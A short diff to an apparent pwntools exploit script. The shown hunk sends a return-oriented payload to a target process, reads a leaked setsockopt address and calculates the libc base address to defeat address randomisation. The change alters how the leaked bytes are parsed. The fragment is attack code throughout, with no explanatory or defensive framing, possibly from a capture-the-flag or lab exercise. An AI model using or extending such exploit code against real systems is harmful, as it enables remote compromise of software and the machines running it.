@@ -86,8 +86,7 @@ payload += p64(fork_plt)
 p = get_process()
 p.sendline(payload)
 # Receive leaked address
-leaked_setsockopt = p.recvn(8)
-leaked_setsockopt_addr = u64(leaked_setsockopt)
+leaked_setsockopt_addr = u64(p.recv(8).strip().ljust(8, b'\x00'))
 print(f"Leaked setsockopt address: {hex(leaked_setsockopt_addr)}")
 libc_base = leaked_setsockopt_addr - libc_setsockopt_offset
 print(f"Calculated libc base address: {hex(libc_base)}")
